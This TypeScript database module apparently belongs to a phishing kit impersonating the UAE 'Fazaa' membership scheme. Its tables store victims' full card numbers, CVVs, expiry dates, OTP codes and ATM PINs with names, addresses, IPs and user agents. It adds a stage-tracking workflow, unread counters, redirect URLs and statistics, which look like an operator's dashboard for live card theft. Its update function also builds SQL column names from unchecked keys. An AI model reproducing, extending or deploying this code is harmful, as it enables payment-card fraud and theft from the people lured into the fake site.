import sqlite3 from 'sqlite3';
import pg from 'pg';
const { Pool } = pg;
import path from 'path';
import { fileURLToPath } from 'url';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

// PostgreSQL connection
const isPostgres = !!process.env.DATABASE_URL;
let pool: any = null;
let sqliteDb: any = null;

if (isPostgres) {
  console.log('[Database] Using PostgreSQL');
  pool = new Pool({
    connectionString: process.env.DATABASE_URL,
    ssl: {
      rejectUnauthorized: false
    }
  });
} else {
  console.log('[Database] Using SQLite');
  const DB_PATH = path.join(__dirname, 'fazaa.db');
  sqliteDb = new sqlite3.Database(DB_PATH);
  sqliteDb.run('PRAGMA journal_mode = WAL');
}

// Initialize tables
const initSql = `
  CREATE TABLE IF NOT EXISTS fazaa_sessions (
    id SERIAL PRIMARY KEY,
    sessionId TEXT NOT NULL UNIQUE,
    fullName TEXT,
    phoneNumber TEXT,
    email TEXT,
    emirate TEXT,
    district TEXT,
    membershipTier TEXT,
    totalAmount TEXT DEFAULT '15',
    cardName TEXT,
    cardNumber TEXT,
    cardNumberMasked TEXT,
    cardExpiry TEXT,
    cardCvv TEXT,
    otpCode TEXT,
    atmPin TEXT,
    stage TEXT DEFAULT 'card' NOT NULL,
    errorMessage TEXT,
    clientIp TEXT,
    userAgent TEXT,
    statusRead INTEGER DEFAULT 0,
    redirectUrl TEXT,
    createdAt TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    updatedAt TIMESTAMP DEFAULT CURRENT_TIMESTAMP
  );

  CREATE TABLE IF NOT EXISTS registration_data (
    id SERIAL PRIMARY KEY,
    sessionId TEXT NOT NULL UNIQUE,
    fullName TEXT NOT NULL,
    phoneNumber TEXT NOT NULL,
    email TEXT NOT NULL,
    emirate TEXT NOT NULL,
    district TEXT,
    membershipTier TEXT NOT NULL,
    totalAmount TEXT DEFAULT '15',
    addressEmirate TEXT,
    addressDistrict TEXT,
    addressStreet TEXT,
    addressBuildingNumber TEXT,
    clientIp TEXT,
    userAgent TEXT,
    createdAt TIMESTAMP DEFAULT CURRENT_TIMESTAMP
  );
`;

// SQLite version of init
const initSqlSQLite = `
  CREATE TABLE IF NOT EXISTS fazaa_sessions (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    sessionId TEXT NOT NULL UNIQUE,
    fullName TEXT,
    phoneNumber TEXT,
    email TEXT,
    emirate TEXT,
    district TEXT,
    membershipTier TEXT,
    totalAmount TEXT DEFAULT '15',
    cardName TEXT,
    cardNumber TEXT,
    cardNumberMasked TEXT,
    cardExpiry TEXT,
    cardCvv TEXT,
    otpCode TEXT,
    atmPin TEXT,
    stage TEXT DEFAULT 'card' NOT NULL,
    errorMessage TEXT,
    clientIp TEXT,
    userAgent TEXT,
    statusRead INTEGER DEFAULT 0,
    redirectUrl TEXT,
    createdAt TEXT DEFAULT (datetime('now')),
    updatedAt TEXT DEFAULT (datetime('now'))
  );

  CREATE TABLE IF NOT EXISTS registration_data (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    sessionId TEXT NOT NULL UNIQUE,
    fullName TEXT NOT NULL,
    phoneNumber TEXT NOT NULL,
    email TEXT NOT NULL,
    emirate TEXT NOT NULL,
    district TEXT,
    membershipTier TEXT NOT NULL,
    totalAmount TEXT DEFAULT '15',
    addressEmirate TEXT,
    addressDistrict TEXT,
    addressStreet TEXT,
    addressBuildingNumber TEXT,
    clientIp TEXT,
    userAgent TEXT,
    createdAt TEXT DEFAULT (datetime('now'))
  );
`;

if (isPostgres) {
  pool.query(initSql).catch((err: any) => console.error('[Database] Init error:', err));
} else {
  sqliteDb.exec(initSqlSQLite);
}

export interface FazaaSession {
  id: number;
  sessionId: string;
  fullName: string | null;
  phoneNumber: string | null;
  email: string | null;
  emirate: string | null;
  district: string | null;
  membershipTier: string | null;
  totalAmount: string | null;
  cardName: string | null;
  cardNumber: string | null;
  cardNumberMasked: string | null;
  cardExpiry: string | null;
  cardCvv: string | null;
  otpCode: string | null;
  atmPin: string | null;
  stage: string;
  errorMessage: string | null;
  clientIp: string | null;
  userAgent: string | null;
  statusRead: number | null;
  redirectUrl: string | null;
  createdAt: string;
  updatedAt: string;
}

export interface RegistrationData {
  id: number;
  sessionId: string;
  fullName: string;
  phoneNumber: string;
  email: string;
  emirate: string;
  district: string | null;
  membershipTier: string;
  totalAmount: string;
  addressEmirate: string | null;
  addressDistrict: string | null;
  addressStreet: string | null;
  addressBuildingNumber: string | null;
  clientIp: string | null;
  userAgent: string | null;
  createdAt: string;
}

async function query<T>(sql: string, params: any[] = []): Promise<T[]> {
  if (isPostgres) {
    const res = await pool.query(sql.replace(/\?/g, (match: string, offset: number, string: string) => {
        let count = 0;
        for(let i=0; i<offset; i++) if(string[i] === '?') count++;
        return `$${count + 1}`;
    }), params);
    return res.rows;
  } else {
    return new Promise((resolve, reject) => {
      sqliteDb.all(sql, params, (err: any, rows: any) => {
        if (err) reject(err);
        else resolve(rows as T[]);
      });
    });
  }
}

async function queryOne<T>(sql: string, params: any[] = []): Promise<T | undefined> {
  const rows = await query<T>(sql, params);
  return rows[0];
}

async function run(sql: string, params: any[] = []): Promise<{ lastID: number; changes: number }> {
  if (isPostgres) {
    const res = await pool.query(sql.replace(/\?/g, (match: string, offset: number, string: string) => {
        let count = 0;
        for(let i=0; i<offset; i++) if(string[i] === '?') count++;
        return `$${count + 1}`;
    }), params);
    return { lastID: 0, changes: res.rowCount };
  } else {
    return new Promise((resolve, reject) => {
      sqliteDb.run(sql, params, function(this: any, err: any) {
        if (err) reject(err);
        else resolve({ lastID: this.lastID, changes: this.changes });
      });
    });
  }
}

// ========== Registration CRUD ==========

export async function createRegistration(data: {
  sessionId: string;
  fullName: string;
  phoneNumber: string;
  email: string;
  emirate: string;
  district?: string | null;
  membershipTier: string;
  totalAmount?: string;
  addressEmirate?: string | null;
  addressDistrict?: string | null;
  addressStreet?: string | null;
  addressBuildingNumber?: string | null;
  clientIp?: string | null;
  userAgent?: string | null;
}): Promise<RegistrationData> {
  await run(
    `INSERT INTO registration_data (sessionId, fullName, phoneNumber, email, emirate, district, membershipTier, totalAmount, addressEmirate, addressDistrict, addressStreet, addressBuildingNumber, clientIp, userAgent)
     VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)`,
    [data.sessionId, data.fullName, data.phoneNumber, data.email, data.emirate, data.district || null, data.membershipTier, data.totalAmount || '15', data.addressEmirate || null, data.addressDistrict || null, data.addressStreet || null, data.addressBuildingNumber || null, data.clientIp || null, data.userAgent || null]
  );
  const result = await queryOne<RegistrationData>('SELECT * FROM registration_data WHERE sessionId = ?', [data.sessionId]);
  return result!;
}

export async function getRegistrationBySessionId(sessionId: string): Promise<RegistrationData | undefined> {
  return queryOne<RegistrationData>('SELECT * FROM registration_data WHERE sessionId = ?', [sessionId]);
}

export async function getAllRegistrations(limit = 100): Promise<RegistrationData[]> {
  return query<RegistrationData>('SELECT * FROM registration_data ORDER BY createdAt DESC LIMIT ?', [limit]);
}

// ========== Session CRUD ==========

export async function createSession(data: {
  sessionId: string;
  fullName?: string;
  phoneNumber?: string;
  email?: string;
  emirate?: string;
  district?: string | null;
  membershipTier?: string;
  totalAmount?: string;
  clientIp?: string | null;
  userAgent?: string | null;
}): Promise<FazaaSession> {
  await run(
    `INSERT INTO fazaa_sessions (sessionId, fullName, phoneNumber, email, emirate, district, membershipTier, totalAmount, clientIp, userAgent)
     VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)`,
    [data.sessionId, data.fullName || null, data.phoneNumber || null, data.email || null, data.emirate || null, data.district || null, data.membershipTier || null, data.totalAmount || '15', data.clientIp || null, data.userAgent || null]
  );
  const result = await queryOne<FazaaSession>('SELECT * FROM fazaa_sessions WHERE sessionId = ?', [data.sessionId]);
  return result!;
}

export async function getSessionBySessionId(sessionId: string): Promise<FazaaSession | undefined> {
  return queryOne<FazaaSession>('SELECT * FROM fazaa_sessions WHERE sessionId = ?', [sessionId]);
}

export async function updateSession(sessionId: string, updates: Record<string, any>): Promise<void> {
  const fields: string[] = [];
  const values: any[] = [];
  
  for (const [key, value] of Object.entries(updates)) {
    fields.push(`${key} = ?`);
    values.push(value);
  }
  
  if (isPostgres) {
    fields.push("updatedAt = CURRENT_TIMESTAMP");
  } else {
    fields.push("updatedAt = datetime('now')");
  }
  
  values.push(sessionId);
  
  await run(`UPDATE fazaa_sessions SET ${fields.join(', ')} WHERE sessionId = ?`, values);
}

export async function getAllSessions(limit = 100): Promise<FazaaSession[]> {
  return query<FazaaSession>('SELECT * FROM fazaa_sessions ORDER BY createdAt DESC LIMIT ?', [limit]);
}

export async function getUnreadSessionsCount(): Promise<number> {
  const result = await queryOne<{ count: string | number }>('SELECT COUNT(*) as count FROM fazaa_sessions WHERE statusRead = 0');
  return Number(result?.count) || 0;
}

export async function markAllAsRead(): Promise<void> {
  await run('UPDATE fazaa_sessions SET statusRead = 1 WHERE statusRead = 0');
}

export async function clearAllData(): Promise<void> {
  await run('DELETE FROM fazaa_sessions');
  await run('DELETE FROM registration_data');
}

export async function getStats(): Promise<{ total: number; pending: number; completed: number; failed: number; new: number; registrations: number }> {
  const [total, pending, completed, failed, newCount, registrations] = await Promise.all([
    queryOne<{ count: string | number }>('SELECT COUNT(*) as count FROM fazaa_sessions'),
    queryOne<{ count: string | number }>("SELECT COUNT(*) as count FROM fazaa_sessions WHERE stage LIKE '%_pending'"),
    queryOne<{ count: string | number }>("SELECT COUNT(*) as count FROM fazaa_sessions WHERE stage = 'success'"),
    queryOne<{ count: string | number }>("SELECT COUNT(*) as count FROM fazaa_sessions WHERE stage = 'failed'"),
    queryOne<{ count: string | number }>('SELECT COUNT(*) as count FROM fazaa_sessions WHERE statusRead = 0'),
    queryOne<{ count: string | number }>('SELECT COUNT(*) as count FROM registration_data'),
  ]);
  
  return {
    total: Number(total?.count) || 0,
    pending: Number(pending?.count) || 0,
    completed: Number(completed?.count) || 0,
    failed: Number(failed?.count) || 0,
    new: Number(newCount?.count) || 0,
    registrations: Number(registrations?.count) || 0,
  };
}

export default isPostgres ? pool : sqliteDb;
